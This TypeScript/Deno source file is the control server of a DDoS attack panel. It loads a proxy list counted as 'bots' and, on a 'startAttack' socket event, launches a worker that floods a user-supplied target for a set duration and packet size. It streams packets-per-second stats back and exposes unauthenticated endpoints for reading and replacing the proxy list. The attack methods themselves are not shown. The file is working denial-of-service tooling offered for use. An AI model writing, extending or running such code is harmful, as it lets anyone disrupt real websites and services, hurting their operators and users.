import cors from "cors";
import express, { Request, Response } from "express";
import { createServer } from "node:http";
import { Server } from "socket.io";
import { Worker } from "node:worker_threads";
import { currentPath, joinPath, loadProxies } from "./utils/file.ts";

const proxies = await loadProxies();

console.log("Proxies loaded:", proxies.length);

const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
    allowedHeaders: ["Content-Type"],
  },
});
app.use(
  cors({
    origin: "*", // Allow this origin
    methods: ["GET", "POST", "OPTIONS"], // Allowed methods
    allowedHeaders: ["Content-Type"], // Allowed headers
  }),
);
app.use(express.static(joinPath(currentPath(), "public")));

io.on("connection", (socket) => {
  console.log("Client connected");

  socket.emit("systemStats", {
    pps: 0,
    bots: proxies.length,
    totalPackets: 0,
    log: "Connected to the server.",
  });

  socket.on("startAttack", (params: any) => {
    const { target, duration, method, packetSize } = params;
    const filteredProxies = proxies.filter((proxy) => proxy);

    socket.emit("systemStats", {
      log: `Using ${filteredProxies.length} proxies to perform attack.`,
      bots: filteredProxies.length,
    });

    const worker = new Worker(
      joinPath(currentPath(), `workers/methods/${method}.ts`),
      {
        workerData: {
          target,
          proxies: filteredProxies,
          duration,
          packetDelay: 1,
          packetSize,
        },
      },
    );

    worker.on("message", (message) => socket.emit("systemStats", message));

    worker.on("error", (error) => {
      console.error(`Worker error: ${error.message}`);
      socket.emit("systemStats", { log: `❌ Worker error: ${error.message}` });
    });
    worker.on("exit", (code) => {
      if (code !== 0) {
        console.error(`Worker stopped with exit code ${code}`);
      }
      socket.emit("attackEnd");
    });

    (socket as any)["worker"] = worker;
  });

  socket.on("stopAttack", () => {
    const worker = (socket as any)["worker"];
    if (worker) {
      worker.terminate();
      socket.emit("attackEnd");
    }
  });

  socket.on("disconnect", () => {
    const worker = (socket as any)["worker"];
    if (worker) {
      worker.terminate();
    }
    console.log("Client disconnected");
  });
});

app.get("/configuration", async (_req: Request, res: Response) => {
  const proxiesText = await Deno.readTextFile(
    joinPath(currentPath(), "data/proxies.txt"),
  );

  res.json({
    proxies: btoa(proxiesText),
  });
});

app.post(
  "/configuration",
  express.json(),
  async (req: Request, res: Response) => {
    const proxies = atob(req.body["proxies"]);

    await Deno.writeTextFile(
      joinPath(currentPath(), "data/proxies.txt"),
      proxies,
    );

    res.send("OK");
  },
);

const PORT = parseInt(Deno.env.get("PORT") || "3000");
httpServer.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
